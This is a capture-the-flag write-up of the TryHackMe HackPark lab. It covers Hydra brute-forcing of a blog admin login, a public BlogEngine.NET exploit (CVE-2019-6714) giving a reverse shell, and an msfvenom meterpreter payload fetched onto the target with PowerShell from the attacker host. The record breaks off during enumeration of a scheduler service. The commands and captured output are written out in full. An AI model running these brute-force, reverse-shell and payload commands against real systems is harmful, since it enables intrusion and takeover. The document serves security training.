---
Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!
---

# HackPark — Writeup

## Overview
### HackPark — Writeup
### HackPark — Writeup
![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/8c8b2105d74035ca43531681439b457e.png)
Connect to our network and deploy this machine. Please be patient as this machine can take up to 5 minutes to boot! You can test if you are connected to our network, by going to our access page. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
This room will cover brute-forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows.
```text
go to http://10.10.97.210/
then reverse image search  the clown (google extension)
google lens
or

download image and search on google images , or using yandex (but is written in russian)

PennyWise
```
Whats the name of the clown displayed on the homepage?
*PennyWise*
### Using Hydra to brute-force a login
![](https://i.imgur.com/8wR5oby.png)
Hydra is a parallelized, fast and flexible login cracker. If you don't have Hydra installed or need a Linux machine to use it, you can deploy a powerful Kali Linux machine and control it in your browser!
Brute-forcing can be trying every combination of a password. Dictionary-attack's are also a type of brute-forcing, where we iterating through a wordlist to obtain the password.
We need to find a login page to attack and identify what type of request the form is making to the webserver. Typically, web servers make two types of requests, a GET request which is used to request data from a webserver and a POST request which is used to send data to a server.
You can check what request a form is making by right clicking on the login form, inspecting the element and then reading the value in the method field. You can also identify this if you are intercepting the traffic through BurpSuite (other HTTP methods can be found [here](https://www.w3schools.com/tags/ref_httpmethods.asp)).
```text
got to ip/login

http://10.10.97.210/Account/login.aspx?ReturnURL=%2fadmin%2f

then inspect/network and see what HTTp method is, so enter an username and pass whatever a check is POST

or
```

## Exploitation
```text
┌──(kali㉿kali)-[~/alfred]
└─$ curl -s http://10.10.97.210/Account/login.aspx?ReturnURL=/admin/ | grep "<form"
    <form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">

using burpsuite and hydra

POST /Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1

Host: 10.10.97.210

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 760

Origin: http://10.10.97.210

Connection: close

Referer: http://10.10.97.210/Account/login.aspx?ReturnURL=%2fadmin%2f

Upgrade-Insecure-Requests: 1

__VIEWSTATE=savs4w5xqq5WN1BwyyEabVd2wCjIHbtPaIzFXyli0Hro5Z%2BIBinh%2BoGn8tvVKr1%2FTlGup1EuUA0ZBMtp3HRW2S6OkqH7hS2txGcnULjZsHRm7kSndR8xZMFIuyVcDMo3Rk%2FBG7aBZUmPtrYKC5an0BxHd5Uj%2FSghlV6rpjW5wOJA7qA5SmA3l1dZsjf%2FOZC6604p1bA%2BWaCXqojeVCVe56bIgRk%2FpFz17kbJr5M92Xu56xNDqpWcb%2BswOEdSNyTiTqYEpPgNE0RHyFnFeH67KOSNmBXJy2m5QS%2Fsv1jN77dqygGjB%2FsUqdzSg%2FQCCWF9jvPPeqd8yvZr4VJzXsbq5Dqa4Wrw9ebPT8Otp757fPC543EH&__EVENTVALIDATION=WN2%2BrJK%2FRbdWWf5QzfkOh3ZxWugDIs8I71cy1eGi%2BCEHlhHGgGG0F5LyD4fBmlTa3Byi1qHu5QFbMENwxtj6whqxw57RpdgghX3py30FH%2FHPpYN9PvQh1sOrSUZy2tM1kLhEhAFky2Vm27AboCtZZYMph3qP8o0SVvRpaYe%2BD7jDJZsC&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in

so
```
```text
┌──(kali㉿kali)-[~/alfred]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.97.210 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=savs4w5xqq5WN1BwyyEabVd2wCjIHbtPaIzFXyli0Hro5Z%2BIBinh%2BoGn8tvVKr1%2FTlGup1EuUA0ZBMtp3HRW2S6OkqH7hS2txGcnULjZsHRm7kSndR8xZMFIuyVcDMo3Rk%2FBG7aBZUmPtrYKC5an0BxHd5Uj%2FSghlV6rpjW5wOJA7qA5SmA3l1dZsjf%2FOZC6604p1bA%2BWaCXqojeVCVe56bIgRk%2FpFz17kbJr5M92Xu56xNDqpWcb%2BswOEdSNyTiTqYEpPgNE0RHyFnFeH67KOSNmBXJy2m5QS%2Fsv1jN77dqygGjB%2FsUqdzSg%2FQCCWF9jvPPeqd8yvZr4VJzXsbq5Dqa4Wrw9ebPT8Otp757fPC543EH&__EVENTVALIDATION=WN2%2BrJK%2FRbdWWf5QzfkOh3ZxWugDIs8I71cy1eGi%2BCEHlhHGgGG0F5LyD4fBmlTa3Byi1qHu5QFbMENwxtj6whqxw57RpdgghX3py30FH%2FHPpYN9PvQh1sOrSUZy2tM1kLhEhAFky2Vm27AboCtZZYMph3qP8o0SVvRpaYe%2BD7jDJZsC&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-27 13:32:38
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.97.210:80/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=savs4w5xqq5WN1BwyyEabVd2wCjIHbtPaIzFXyli0Hro5Z%2BIBinh%2BoGn8tvVKr1%2FTlGup1EuUA0ZBMtp3HRW2S6OkqH7hS2txGcnULjZsHRm7kSndR8xZMFIuyVcDMo3Rk%2FBG7aBZUmPtrYKC5an0BxHd5Uj%2FSghlV6rpjW5wOJA7qA5SmA3l1dZsjf%2FOZC6604p1bA%2BWaCXqojeVCVe56bIgRk%2FpFz17kbJr5M92Xu56xNDqpWcb%2BswOEdSNyTiTqYEpPgNE0RHyFnFeH67KOSNmBXJy2m5QS%2Fsv1jN77dqygGjB%2FsUqdzSg%2FQCCWF9jvPPeqd8yvZr4VJzXsbq5Dqa4Wrw9ebPT8Otp757fPC543EH&__EVENTVALIDATION=WN2%2BrJK%2FRbdWWf5QzfkOh3ZxWugDIs8I71cy1eGi%2BCEHlhHGgGG0F5LyD4fBmlTa3Byi1qHu5QFbMENwxtj6whqxw57RpdgghX3py30FH%2FHPpYN9PvQh1sOrSUZy2tM1kLhEhAFky2Vm27AboCtZZYMph3qP8o0SVvRpaYe%2BD7jDJZsC&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
[STATUS] 936.00 tries/min, 936 tries in 00:01h, 14343463 to do in 255:25h, 16 active
[80][http-post-form] host: 10.10.97.210   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-27 13:34:16

admin:1qaz2wsx

Let's break down the parameters that we have passed to hydra.

    -l → login/username

2.    -P  → Password list

3.   Http-post-form → request data form that is sent to the web server via the browser.

Replace the Username and Password field with “^USER^” & “^PASS^” respectively in the web form request, as hydra will be targeting these parameters for the brute force.

You might have noticed that we added an additional parameter of “Login Failed” at the end of the post form data. This is an error we observed after someone enters wrong credentials.
```
![[Pasted image 20220927121222.png]]
![[Pasted image 20220927123705.png]]
What request type is the Windows website login form using?
*POST*
Now we know the request type and have a URL for the login form, we can get started brute-forcing an account.
![[Pasted image 20220927122543.png]]
Run the following command but fill in the blanks:
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
Guess a username, choose a password wordlist and gain credentials to a user account!
Username is admin... But what is the password?
*1qaz2wsx*
Hydra really does have lots of functionality, and there are many "modules" available (an example of a module would be the http-post-form that we used above).
However, this tool is not only good for brute-forcing HTTP forms, but other protocols such as FTP, SSH, SMTP, SMB and more.
Below is a mini cheatsheet:
Command	Description
hydra -P <wordlist> -v <ip> <protocol>
Brute force against a protocol of your choice
hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>
You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)
hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
Attack a Windows Remote Desktop with a password list.
hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
Craft a more specific request for Hydra to brute force.
### Compromise the machine
![](https://i.imgur.com/FhJQrqE.png)
In this task, you will identify and execute a public exploit (from exploit-db.com) to get initial access on this Windows machine!
Exploit-Database is a CVE (common vulnerability and exposures) archive of public exploits and corresponding vulnerable software, developed for the use of penetration testers and vulnerability researches. It is owned by Offensive Security (who are responsible for OSCP and Kali)
```text
log in 

then click about

Your BlogEngine.NET Specification

    Version: 3.3.6.0
    Configuration: Single blog
    Trust level: Unrestricted
    Identity: IIS APPPOOL\Blog
    Blog provider: XmlBlogProvider
    Membership provider: XmlMembershipProvider
    Role provider: XmlRoleProvider

vulnerability blogengine 3.3.6.0 (googling)

https://www.exploit-db.com/exploits/46353

Let’s follow the instructions:

    Start by modifying the script so that we report the correct value for IP and port.
    Rename your script as PostView.ascx
    Go to posts (http://10.10.79.198/admin/#/content/posts) and click on “Welcome to HackPark” to edit this post
    From the edit bar on top of the post, click on the “File Manager” icon
    Click on the “+ UPLOAD” button and upload the PostView.ascx script
    Close the file manager and click on “Save”
    Now, open your listener (rlwrap nc -nlvp 1234)
    Go to http://10.10.79.198/?theme=../../App_Data/files

Check your listener, you should now have a reverse shell.
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ nano 46353.cs
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ mv 46353.cs PostView.ascx

upload this follow instructions before
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -nlvp 4445 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4445
Ncat: Listening on 0.0.0.0:4445
Ncat: Connection from 10.10.97.210.
Ncat: Connection from 10.10.97.210:49285.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
```
Now you have logged into the website, are you able to identify the version of the BlogEngine?
*3.3.6.0*
Use the exploit database archive to find an exploit to gain a reverse shell on this system.
What is the CVE?
Look on the exploit database page. Answer is in the format: CVE-YEAR-NUMBER
*CVE-2019-6714 *
![[Pasted image 20220927125117.png]]
Using the public exploit, gain initial access to the server.
Who is the webserver running as?
iis apppool\blog

## Privilege Escalation
![|333](https://i.imgur.com/IA4n6AV.png)
In this task we will learn about the basics of Windows Privilege Escalation.
First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered information to exploit the system and become the Administrator.
Our netcat session is a little unstable, so lets generate another reverse shell using msfvenom.
If you don't know how to do this, I suggest completing the Metasploit room first!
![](https://i.imgur.com/lXRXJ5a.png)
Tip: You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ mkdir hackpark
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ cd hackpark
```
```text
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.81.220 LPORT=2345 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: revshell.exe
```
```text
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.97.210 - - [27/Sep/2022 13:58:59] "GET /revshell.exe HTTP/1.1" 200 -

passing shell

powershell -c "Invoke-WebRequest -Uri 'http://10.11.81.220:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
c:\windows\system32\inetsrv>powershell -c "Invoke-WebRequest -Uri 'http://10.11.81.220:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
cd c:\windows\temp
c:\windows\system32\inetsrv>cd c:\windows\temp
dir
c:\Windows\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of c:\Windows\Temp
09/27/2022  10:59 AM    <DIR>          .
09/27/2022  10:59 AM    <DIR>          ..
08/06/2019  02:13 PM             8,795 Amazon_SSM_Agent_20190806141239.log
08/06/2019  02:13 PM           181,468 Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI.log
08/06/2019  02:13 PM             1,206 cleanup.txt
08/06/2019  02:13 PM               421 cmdout
08/06/2019  02:11 PM                 0 DMI2EBC.tmp
08/03/2019  10:43 AM                 0 DMI4D21.tmp
08/06/2019  02:12 PM             8,743 EC2ConfigService_20190806141221.log
08/06/2019  02:12 PM           292,438 EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64.log
09/27/2022  10:59 AM            73,802 revshell.exe
08/06/2019  02:13 PM                21 stage1-complete.txt
08/06/2019  02:13 PM            28,495 stage1.txt
05/12/2019  09:03 PM           113,328 svcexec.exe
08/06/2019  02:13 PM                67 tmp.dat
              13 File(s)        708,784 bytes
               2 Dir(s)  39,125,929,984 bytes free
.\revshell.exe
c:\Windows\Temp>.\revshell.exe
```
```text
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ msfconsole -q
```
```text
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```
```text
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
```
```text
msf6 exploit(multi/handler) > set LHOST 10.11.81.220
LHOST => 10.11.81.220
```
```text
msf6 exploit(multi/handler) > set LPORT 2345
LPORT => 2345
```
```text
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.81.220:2345 

.\revshell.exe
c:\Windows\Temp>.\revshell.exe
```
```text
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ msfconsole -q
```
```text
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```
```text
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
```
```text
msf6 exploit(multi/handler) > set LHOST 10.11.81.220
LHOST => 10.11.81.220
```
```text
msf6 exploit(multi/handler) > set LPORT 2345
LPORT => 2345
```
```text
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.81.220:2345 
[*] Sending stage (175686 bytes) to 10.10.97.210
[*] Meterpreter session 1 opened (10.11.81.220:2345 -> 10.10.97.210:49295) at 2022-09-27 14:01:11 -0400
```
```text
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```
You can run metasploit commands such as sysinfo to get detailed information about the Windows system. Then feed this information into the [windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) script and quickly identify any obvious vulnerabilities.
What is the OS version of this windows machine?
*Windows 2012 R2 (6.3 Build 9600)*
```text
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User              Path
 ---   ----  ----                  ----  -------  ----              ----
 0     0     [System Process]
 4     0     System
 372   4     smss.exe
 480   2444  Message.exe
 484   2060  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
 524   516   csrss.exe
 580   568   csrss.exe
 588   516   wininit.exe
 616   568   winlogon.exe
 676   588   services.exe
 684   588   lsass.exe
 740   676   svchost.exe
 784   676   svchost.exe
 860   616   dwm.exe
 872   676   svchost.exe
 900   676   svchost.exe
 960   676   svchost.exe
 976   676   svchost.exe
 1016  676   svchost.exe
 1032  676   msdtc.exe
 1104  484   conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
 1136  676   spoolsv.exe
 1164  676   amazon-ssm-agent.exe
 1244  676   svchost.exe
 1264  676   LiteAgent.exe
 1296  676   svchost.exe
 1364  676   svchost.exe
 1380  676   svchost.exe
 1412  676   WService.exe
 1552  1412  WScheduler.exe
 1656  676   Ec2Config.exe
 1748  740   WmiPrvSE.exe
 2060  1380  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
 2444  2036  WScheduler.exe
 2536  900   taskhostex.exe
 2548  484   revshell.exe          x86   0        IIS APPPOOL\Blog  c:\Windows\Temp\revshell.exe
 2612  2604  explorer.exe
 3064  2576  ServerManager.exe
```
Further enumerate the machine.
What is the name of the abnormal service running?
Check in the "C:\Program Files (x86)" directory and go from there. Remember, you can use meterpreter to check all running processes on the machine.
*WindowsScheduler*
```text
meterpreter > cd "c:\program files (x86)"
```
```text
meterpreter > ls
Listing: c:\program files (x86)
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2013-08-22 11:39:30 -0400  Common Files
040777/rwxrwxrwx  4096  dir   2014-03-21 15:07:01 -0400  Internet Explorer
040777/rwxrwxrwx  0     dir   2013-08-22 11:39:30 -0400  Microsoft.NET
040777/rwxrwxrwx  8192  dir   2019-08-04 07:37:02 -0400  SystemScheduler
040777/rwxrwxrwx  0     dir   2019-08-06 17:12:04 -0400  Uninstall Information
040777/rwxrwxrwx  0     dir   2013-08-22 11:39:33 -0400  Windows Mail
040777/rwxrwxrwx  0     dir   2013-08-22 11:39:30 -0400  Windows NT
040777/rwxrwxrwx  0     dir   2013-08-22 11:39:30 -0400  WindowsPowerShell
100666/rw-rw-rw-  174   fil   2013-08-22 11:37:57 -0400  desktop.ini
```
```text
meterpreter > cd SystemScheduler
```
```text
meterpreter > ls
Listing: c:\program files (x86)\SystemScheduler
===============================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  4096     dir   2022-09-27 14:07:34 -0400  Events
100666/rw-rw-rw-  60       fil   2019-08-04 07:36:42 -0400  Forum.url
100666/rw-rw-rw-  9813     fil   2004-11-16 02:16:34 -0500  License.txt
100666/rw-rw-rw-  1496     fil   2022-09-27 12:48:33 -0400  LogFile.txt
100666/rw-rw-rw-  3760     fil   2022-09-27 12:49:02 -0400  LogfileAdvanced.txt
100777/rwxrwxrwx  536992   fil   2018-03-25 13:58:56 -0400  Message.exe
100777/rwxrwxrwx  445344   fil   2018-03-25 13:59:00 -0400  PlaySound.exe
100777/rwxrwxrwx  27040    fil   2018-03-25 13:58:58 -0400  PlayWAV.exe
100666/rw-rw-rw-  149      fil   2019-08-04 18:05:19 -0400  Preferences.ini
100777/rwxrwxrwx  485792   fil   2018-03-25 13:58:58 -0400  Privilege.exe
100666/rw-rw-rw-  10100    fil   2018-03-24 15:09:04 -0400  ReadMe.txt
100777/rwxrwxrwx  112544   fil   2018-03-25 13:58:58 -0400  RunNow.exe
100777/rwxrwxrwx  235936   fil   2018-03-25 13:58:56 -0400  SSAdmin.exe
100777/rwxrwxrwx  731552   fil   2018-03-25 13:58:56 -0400  SSCmd.exe
100777/rwxrwxrwx  456608   fil   2018-03-25 13:58:58 -0400  SSMail.exe
100777/rwxrwxrwx  1633696  fil   2018-03-25 13:58:52 -0400  Scheduler.exe
100777/rwxrwxrwx  491936   fil   2018-03-25 13:59:00 -0400  SendKeysHelper.exe
100777/rwxrwxrwx  437664   fil   2018-03-25 13:58:56 -0400  ShowXY.exe
100777/rwxrwxrwx  439712   fil   2018-03-25 13:58:56 -0400  ShutdownGUI.exe
100666/rw-rw-rw-  785042   fil   2006-05-16 19:49:52 -0400  WSCHEDULER.CHM
100666/rw-rw-rw-  703081   fil   2006-05-16 19:58:18 -0400  WSCHEDULER.HLP
100777/rwxrwxrwx  136096   fil   2018-03-25 13:58:58 -0400  WSCtrl.exe
100777/rwxrwxrwx  68512    fil   2018-03-25 13:58:54 -0400  WSLogon.exe
100666/rw-rw-rw-  33184    fil   2018-03-25 13:59:00 -0400  WSProc.dll
100666/rw-rw-rw-  2026     fil   2006-05-16 18:58:18 -0400  WScheduler.cnt
100777/rwxrwxrwx  331168   fil   2018-03-25 13:58:52 -0400  WScheduler.exe
100777/rwxrwxrwx  98720    fil   2018-03-25 13:58:54 -0400  WService.exe
100666/rw-rw-rw-  54       fil   2019-08-04 07:36:42 -0400  Website.url
100777/rwxrwxrwx  76704    fil   2018-03-25 13:58:58 -0400  WhoAmI.exe
100666/rw-rw-rw-  1150     fil   2007-05-17 16:47:02 -0400  alarmclock.ico
100666/rw-rw-rw-  766      fil   2003-08-31 15:06:08 -0400  clock.ico
100666/rw-rw-rw-  80856    fil   2003-08-31 15:06:10 -0400  ding.wav
100666/rw-rw-rw-  1637972  fil   2009-01-08 22:21:48 -0500  libeay32.dll
100777/rwxrwxrwx  40352    fil   2018-03-25 13:59:00 -0400  sc32.exe
100666/rw-rw-rw-  766      fil   2003-08-31 15:06:26 -0400  schedule.ico
100666/rw-rw-rw-  355446   fil   2009-01-08 22:12:34 -0500  ssleay32.dll
100666/rw-rw-rw-  6999     fil   2019-08-04 07:36:42 -0400  unins000.dat
100777/rwxrwxrwx  722597   fil   2019-08-04 07:36:32 -0400  unins000.exe
100666/rw-rw-rw-  6574     fil   2009-06-26 20:27:32 -0400  whiteclock.ico
```
```text
meterpreter > cd Events
```
```text
meterpreter > ls
Listing: c:\program files (x86)\SystemScheduler\Events
======================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  1926   fil   2022-09-27 14:08:01 -0400  20198415519.INI
100666/rw-rw-rw-  28489  fil   2022-09-27 14:08:01 -0400  20198415519.INI_LOG.txt
100666/rw-rw-rw-  290    fil   2020-10-02 17:50:12 -0400  2020102145012.INI
100666/rw-rw-rw-  186    fil   2022-09-27 14:01:16 -0400  Administrator.flg
100666/rw-rw-rw-  182    fil   2022-09-27 14:01:13 -0400  SYSTEM_svc.flg
100666/rw-rw-rw-  0      fil   2022-09-27 12:49:02 -0400  Scheduler.flg
100666/rw-rw-rw-  449    fil   2022-09-27 14:01:16 -0400  SessionInfo.flg
100666/rw-rw-rw-  0      fil   2022-09-27 14:01:28 -0400  service.flg
```
```text
meterpreter > cat 20198415519.INI_LOG.txt 
08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
08/04/19 15:07:00,Event Started Ok, (Administrator)
08/04/19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator)
08/04/19 15:08:00,Event Started Ok, (Administrator)
08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)
08/04/19 15:09:00,Event Started Ok, (Administrator)
08/04/19 15:09:34,Process Ended. PID:3024,ExitCode:4,Message.exe (Administrator)
08/04/19 15:10:00,Event Started Ok, (Administrator)
08/04/19 15:10:33,Process Ended. PID:1556,ExitCode:4,Message.exe (Administrator)
08/04/19 15:11:00,Event Started Ok, (Administrator)
08/04/19 15:11:33,Process Ended. PID:468,ExitCode:4,Message.exe (Administrator)
08/04/19 15:12:00,Event Started Ok, (Administrator)
08/04/19 15:12:33,Process Ended. PID:2244,ExitCode:4,Message.exe (Administrator)
08/04/19 15:13:00,Event Started Ok, (Administrator)
08/04/19 15:13:33,Process Ended. PID:1700,ExitCode:4,Message.exe (Administrator)
08/04/19 16:43:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
08/04/19 16:44:01,Event Started Ok, (Administrator)
08/04/19 16:44:05,Process Ended. PID:2228,ExitCode:1,Message.exe (Administrator)
08/04/19 16:45:00,Event Started Ok, (Administrator)
08/04/19 16:45:20,Process Ended. PID:2640,ExitCode:1,Message.exe (Administrator)
08/04/19 16:46:00,Event Started Ok, (Administrator)
08/04/19 16:46:03,Process Ended. PID:2912,ExitCode:1,Message.exe (Administrator)
08/04/19 16:47:00,Event Started Ok, (Administrator)
08/04/19 16:47:24,Process Ended. PID:1944,ExitCode:1,Message.exe (Administrator)
08/04/19 16:48:01,Event Started Ok, (Administrator)
08/04/19 16:48:18,Process Ended. PID:712,ExitCode:1,Message.exe (Administrator)
08/04/19 16:49:00,Event Started Ok, (Administrator)
08/04/19 16:49:23,Process Ended. PID:1936,ExitCode:1,Message.exe (Administrator)
08/04/19 18:00:01,Event Started Ok, (Administrator)
08/04/19 18:00:09,Process Ended. PID:2536,ExitCode:1,Message.exe (Administrator)
08/04/19 18:01:00,Event Started Ok, (Administrator)
08/04/19 18:01:03,Process Ended. PID:2140,ExitCode:1,Message.exe (Administrator)
08/04/19 18:02:01,Event Started Ok, (Administrator)
08/04/19 18:02:03,Process Ended. PID:2652,ExitCode:1,Message.exe (Administrator)
08/04/19 18:03:00,Event Started Ok, (Administrator)
08/04/19 18:03:03,Process Ended. PID:1584,ExitCode:1,Message.exe (Administrator)
08/04/19 18:04:00,Event Started Ok, (Administrator)
08/04/19 18:04:03,Process Ended. PID:2588,ExitCode:1,Message.exe (Administrator)
08/04/19 18:05:01,Event Started Ok, (Administrator)
08/05/19 13:27:01,Event Started Ok, (Administrator)
08/05/19 13:27:01,Process Ended. PID:2836,ExitCode:1,Message.exe (Administrator)
08/05/19 13:28:00,Event Started Ok, (Administrator)
08/05/19 13:28:18,Process Ended. PID:2212,ExitCode:1,Message.exe (Administrator)
08/05/19 13:29:00,Event Started Ok, (Administrator)
08/05/19 13:29:33,Process Ended. PID:2660,ExitCode:4,Message.exe (Administrator)
08/05/19 13:30:01,Event Started Ok, (Administrator)
08/05/19 13:30:34,Process Ended. PID:1996,ExitCode:4,Message.exe (Administrator)
08/05/19 13:31:00,Event Started Ok, (Administrator)
08/05/19 13:31:33,Process Ended. PID:2084,ExitCode:4,Message.exe (Administrator)
08/05/19 13:32:00,Event Started Ok, (Administrator)
08/05/19 13:32:33,Process Ended. PID:1392,ExitCode:4,Message.exe (Administrator)
08/05/19 13:33:00,Event Started Ok, (Administrator)
08/05/19 13:33:33,Process Ended. PID:1208,ExitCode:4,Message.exe (Administrator)
08/05/19 13:34:00,Event Started Ok, (Administrator)
08/05/19 13:34:33,Process Ended. PID:2400,ExitCode:4,Message.exe (Administrator)
08/05/19 13:35:00,Event Started Ok, (Administrator)
08/05/19 13:35:33,Process Ended. PID:1808,ExitCode:4,Message.exe (Administrator)
08/05/19 13:36:00,Event Started Ok, (Administrator)
08/05/19 13:36:33,Process Ended. PID:2428,ExitCode:4,Message.exe (Administrator)
08/05/19 13:37:00,Event Started Ok, (Administrator)
08/05/19 13:37:34,Process Ended. PID:2456,ExitCode:4,Message.exe (Administrator)
08/05/19 13:38:00,Event Started Ok, (Administrator)
08/05/19 13:38:33,Process Ended. PID:2344,ExitCode:4,Message.exe (Administrator)
08/05/19 13:39:00,Event Started Ok, (Administrator)
08/05/19 13:39:34,Process Ended. PID:1396,ExitCode:4,Message.exe (Administrator)
08/05/19 13:40:00,Event Started Ok, (Administrator)
08/05/19 13:40:33,Process Ended. PID:1748,ExitCode:4,Message.exe (Administrator)
08/05/19 13:41:00,Event Started Ok, (Administrator)
08/05/19 13:41:33,Process Ended. PID:2212,ExitCode:4,Message.exe (Administrator)
08/05/19 13:42:00,Event Started Ok, (Administrator)
08/05/19 13:42:32,Process Ended. PID:2800,ExitCode:4,Message.exe (Administrator)
08/05/19 13:43:00,Event Started Ok, (Administrator)
08/05/19 13:43:33,Process Ended. PID:580,ExitCode:4,Message.exe (Administrator)
08/05/19 14:04:01,Event Started Ok, (Administrator)
08/05/19 14:04:33,Process Ended. PID:732,ExitCode:4,Message.exe (Administrator)
08/05/19 14:05:00,Event Started Ok, (Administrator)
08/05/19 14:05:34,Process Ended. PID:1584,ExitCode:4,Message.exe (Administrator)
08/05/19 14:06:00,Event Started Ok, (Administrator)
08/05/19 14:06:33,Process Ended. PID:1980,ExitCode:4,Message.exe (Administrator)
08/05/19 14:07:00,Event Started Ok, (Administrator)
08/05/19 14:07:33,Process Ended. PID:1236,ExitCode:4,Message.exe (Administrator)
08/05/19 14:08:00,Event Started Ok, (Administrator)
08/05/19 14:08:33,Process Ended. PID:1892,ExitCode:4,Message.exe (Administrator)
08/05/19 14:09:00,Event Started Ok, (Administrator)
08/05/19 14:09:33,Process Ended. PID:1852,ExitCode:4,Message.exe (Administrator)
08/05/19 14:10:00,Event Started Ok, (Administrator)
08/05/19 14:10:33,Process Ended. PID:972,ExitCode:4,Message.exe (Administrator)
08/05/19 14:11:00,Event Started Ok, (Administrator)
08/05/19 14:11:34,Process Ended. PID:1684,ExitCode:4,Message.exe (Administrator)
08/05/19 14:12:00,Event Started Ok, (Administrator)
08/05/19 14:12:33,Process Ended. PID:96,ExitCode:4,Message.exe (Administrator)
08/05/19 14:13:00,Event Started Ok, (Administrator)
08/05/19 14:13:34,Process Ended. PID:1620,ExitCode:4,Message.exe (Administrator)
08/05/19 14:15:00,Event Started Ok, (Administrator)
08/05/19 14:15:33,Process Ended. PID:800,ExitCode:4,Message.exe (Administrator)
08/05/19 14:16:00,Event Started Ok, (Administrator)
